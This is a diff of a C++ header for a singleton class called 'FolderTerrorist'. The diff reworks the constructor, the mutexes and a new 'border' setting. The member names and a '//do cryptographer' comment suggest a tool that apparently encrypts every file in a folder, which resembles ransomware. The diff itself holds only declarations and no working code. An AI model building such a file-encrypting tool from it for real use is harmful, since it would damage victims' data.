@@ -9,17 +9,14 @@
 
 class FolderTerrorist {
 public:
-
-    FolderTerrorist();
-
     static FolderTerrorist *GetInstance() {
-        if (p_instance == nullptr) {
-            p_instance = new FolderTerrorist;
+        if (!p_instance) {
+            p_instance = new FolderTerrorist();
         }
         return p_instance;
     }
 
-    ~FolderTerrorist();
+    //~FolderTerrorist();
 
     void SetFolderName(const std::string &folderName);
 
@@ -29,8 +26,12 @@ public:
 
     void Start(std::string path);
 
+    void SetTheBorder(int border);
+
     void SignalsCatching();
 private:
+    FolderTerrorist();
+
     static inline FolderTerrorist *p_instance;
 
     std::string folder_name;
@@ -39,7 +40,10 @@ private:
 
     std::list<std::string> files_queue;
 
-    std::mutex mtx;
+    std::mutex mtx1;
+    std::mutex mtx2;
+    std::mutex mtx3;
+    std::mutex mtx4;
 
     std::vector<std::string> GetFolderFiles();
 
@@ -49,6 +53,8 @@ private:
 
     //do cryptographer
     void FolderFileTerror(const std::string &file_path);
+
+    int border = -1;
 
     static void SignalsHandler(int signal);
 };
